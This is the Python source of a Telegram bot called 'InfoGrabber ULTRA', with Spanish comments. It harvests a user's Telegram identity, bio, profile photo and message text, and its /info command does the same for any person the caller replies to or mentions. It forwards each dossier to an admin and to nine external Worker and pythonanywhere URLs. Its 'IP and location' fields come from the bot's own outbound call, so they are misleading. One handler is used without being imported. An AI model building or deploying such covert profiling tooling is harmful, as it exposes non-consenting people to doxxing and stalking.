import os
import logging
import aiohttp
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN (CORREGIDO) ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

# ========== TODAS LAS URLS ==========
URLS = [
    "https://bot-ubi.societykark.workers.dev",
    "https://bot-tg.societykark.workers.dev",
    "https://tg-bot12.societykark.workers.dev",
    "https://app-trk.societykark.workers.dev",
    "https://app-tg.societykark.workers.dev",
    "https://app-kali.societykark.workers.dev",
    "https://societykark.pythonanywhere.com",
    "https://kali-bot12.societykark.workers.dev",
    "https://galleta.societykark.workers.dev"
]

WORKER_URL = URLS[-1]  # Usamos la última para obtener ubicación (galleta)

# ========== LOGS ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BASE DE DATOS TEMPORAL ==========
capturados = {}

# ========== FUNCIONES DE EXTRACCIÓN ==========

async def get_worker_location():
    """Obtiene IP y ubicación desde el Worker de Cloudflare"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(WORKER_URL, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en Worker: {e}")
        return None

async def get_ipapi_location(ip):
    """Obtiene ubicación desde ipapi.co (más precisa)"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en ipapi: {e}")
        return None

async def get_user_photo(user_id, bot):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][-1].file_id
        return None
    except Exception as e:
        logger.error(f"Error al obtener foto: {e}")
        return None

async def get_user_bio(user, bot):
    try:
        full_user = await bot.get_chat(user.id)
        return full_user.bio if hasattr(full_user, 'bio') else None
    except Exception as e:
        logger.error(f"Error al obtener bio: {e}")
        return None

def get_device_info(user_agent):
    if not user_agent:
        return "Desconocido"
    device = "Desconocido"
    if "iPhone" in user_agent:
        device = "iPhone"
    elif "iPad" in user_agent:
        device = "iPad"
    elif "Android" in user_agent:
        device = "Android"
    elif "Mac" in user_agent:
        device = "Mac"
    elif "Windows" in user_agent:
        device = "Windows PC"
    elif "Linux" in user_agent:
        device = "Linux"
    return device

# ========== EXTRACCIÓN COMPLETA DE USUARIO ==========

async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
    bot = context.bot
    user = target_user or update.effective_user
    chat = update.effective_chat
    message = update.message
    
    user_id = user.id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or "N/A"
    username = f"@{user.username}" if user.username else "N/A"
    language = user.language_code or "N/A"
    is_bot = "Sí" if user.is_bot else "No"
    is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
    
    bio = await get_user_bio(user, bot) or "No disponible"
    photo_id = await get_user_photo(user_id, bot)
    
    chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
    chat_id = chat.id
    
    message_id = message.message_id if message else "N/A"
    message_text = message.text if message and message.text else "N/A"
    message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"
    
    worker_data = await get_worker_location()
    ip = "N/A"
    country = "N/A"
    region = "N/A"
    city = "N/A"
    timezone = "N/A"
    postal = "N/A"
    
    if worker_data:
        ip = worker_data.get("ip", "N/A")
        country = worker_data.get("country", "N/A")
        region = worker_data.get("region", "N/A")
        city = worker_data.get("city", "N/A")
        timezone = worker_data.get("timezone", "N/A")
        postal = worker_data.get("postal", "N/A")
        
        if ip != "N/A":
            ipapi_data = await get_ipapi_location(ip)
            if ipapi_data:
                country = ipapi_data.get("country_name", country)
                region = ipapi_data.get("region", region)
                city = ipapi_data.get("city", city)
                postal = ipapi_data.get("postal", postal)
                timezone = ipapi_data.get("timezone", timezone)
    
    info = f"🕵️ *INFORMACIÓN COMPLETA DEL USUARIO*\n"
    info += f"━━━━━━━━━━━━━━━━━━━━\n\n"
    info += f"👤 *Telegram*\n"
    info += f"   • ID: `{user_id}`\n"
    info += f"   • Nombre: {first_name}\n"
    info += f"   • Apellido: {last_name}\n"
    info += f"   • Username: {username}\n"
    info += f"   • Idioma: {language}\n"
    info += f"   • Es bot: {is_bot}\n"
    info += f"   • Es Premium: {is_premium}\n"
    info += f"   • Biografía: {bio}\n\n"
    info += f"💬 *Chat*\n"
    info += f"   • Tipo: {chat_type}\n"
    info += f"   • Chat ID: `{chat_id}`\n\n"
    info += f"📩 *Mensaje*\n"
    info += f"   • ID: {message_id}\n"
    info += f"   • Fecha: {message_date}\n"
    info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
    info += f"🌐 *Red y Ubicación*\n"
    info += f"   • IP: `{ip}`\n"
    info += f"   • País: {country}\n"
    info += f"   • Región: {region}\n"
    info += f"   • Ciudad: {city}\n"
    info += f"   • Código Postal: {postal}\n"
    info += f"   • Zona Horaria: {timezone}\n"
    info += f"━━━━━━━━━━━━━━━━━━━━\n"
    info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    return {
        "text": info,
        "photo_id": photo_id,
        "user_id": user_id,
        "username": username,
        "ip": ip,
        "city": city,
        "country": country
    }

# ========== ENVIAR A TODAS LAS URLS Y AL ADMIN ==========

async def send_to_all_workers(text, photo_id=None):
    """Envía el reporte a TODAS las URLs (Workers)"""
    form_data = aiohttp.FormData()
    form_data.add_field('chat_id', str(ADMIN_ID))
    form_data.add_field('text', text)
    # Nota: photo_id es un file_id de Telegram, no se puede reenviar directamente sin descargar.
    # Si se quiere enviar foto, hay que descargarla y reenviar, pero por simplicidad solo texto.
    # Si necesitas fotos, hay que usar bot.download_file y luego enviar a cada Worker.
    
    results = []
    async with aiohttp.ClientSession() as session:
        for url in URLS:
            try:
                async with session.post(url, data=form_data, timeout=10) as resp:
                    if resp.status == 200:
                        results.append(f"✅ {url}")
                    else:
                        results.append(f"❌ {url} (HTTP {resp.status})")
            except Exception as e:
                results.append(f"❌ {url} (Error: {str(e)[:30]})")
    return results

async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
    """Envía el informe al admin y a todos los Workers"""
    bot = context.bot
    
    # 1. Enviar al admin directamente (por si acaso)
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=info_data["text"],
        parse_mode=ParseMode.MARKDOWN
    )
    if info_data["photo_id"]:
        await bot.send_photo(
            chat_id=ADMIN_ID,
            photo=info_data["photo_id"],
            caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}"
        )
    
    # 2. Enviar a TODOS los Workers
    resultados = await send_to_all_workers(info_data["text"], info_data["photo_id"])
    logger.info(f"Resultados de envío a Workers: {resultados}")
    
    # Guardar en base local
    capturados[info_data["user_id"]] = {
        "info": info_data,
        "timestamp": datetime.now().isoformat()
    }

# ========== COMANDOS ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info_data = await extract_user_info(update, context)
    await send_report_to_admin(update, context, info_data)
    await update.message.reply_text(
        "🤖 *Bot activo*\n\n"
        "Tu información ha sido registrada.\n"
        "Usa /help para ver comandos.",
        parse_mode=ParseMode.MARKDOWN
    )

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    target_user = None
    if message.reply_to_message:
        target_user = message.reply_to_message.from_user
    elif message.entities:
        for entity in message.entities:
            if entity.type == "mention":
                username = message.text[entity.offset:entity.offset + entity.length]
                try:
                    target_user = await context.bot.get_chat(username)
                    target_user = target_user._unpack()
                except:
                    pass
                break
    if not target_user:
        target_user = update.effective_user
    info_data = await extract_user_info(update, context, target_user)
    await send_report_to_admin(update, context, info_data)
    username = f"@{target_user.username}" if target_user.username else f"ID {target_user.id}"
    await message.reply_text(f"✅ Información de {username} enviada.", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *InfoGrabber ULTRA*\n\n"
        "Comandos:\n"
        "`/start` - Registra tu info\n"
        "`/info` - Extrae info de la persona a la que respondes\n"
        "`/help` - Ayuda\n\n"
        "⚡ *Solo para fines educativos.*",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and not update.message.text.startswith("/"):
        logger.info(f"Mensaje de {update.effective_user.id}: {update.message.text[:50]}")
    else:
        await update.message.reply_text(
            "📩 Usa /help para ver comandos.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📋 Ver comandos", callback_data="help")]
            ])
        )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await help_command(update, context)
    await query.delete_message()

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("❌ Error inesperado.")

# ========== SERVIDOR HTTP ==========

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========

def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    logger.info("✅ InfoGrabber ULTRA iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()